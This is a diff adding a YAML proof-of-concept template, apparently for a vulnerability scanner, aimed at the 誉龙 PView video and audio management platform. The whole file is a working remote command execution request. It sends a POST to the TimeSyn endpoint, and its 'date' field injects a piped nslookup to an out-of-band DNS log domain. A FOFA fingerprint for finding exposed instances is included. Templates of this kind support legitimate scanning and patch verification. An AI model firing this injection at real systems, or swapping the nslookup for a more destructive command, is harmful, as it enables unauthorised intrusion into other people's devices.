@@ -1,0 +1,20 @@
+id: poc-yaml-yulongdt-timesyn-rce
+info:
+  name: 誉龙视音频综合管理平台 TimeSyn远程命令执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: 誉龙视音频综合管理平台
+  fofa: body="PView 视音频管理平台"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /index.php?r=Third/TimeSyn
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cloudKey=0x0&date=|nslookup {{.reverseDomain}}&time=1
+  expression: status_code == 200 && reverse.Verify()
+transport: http
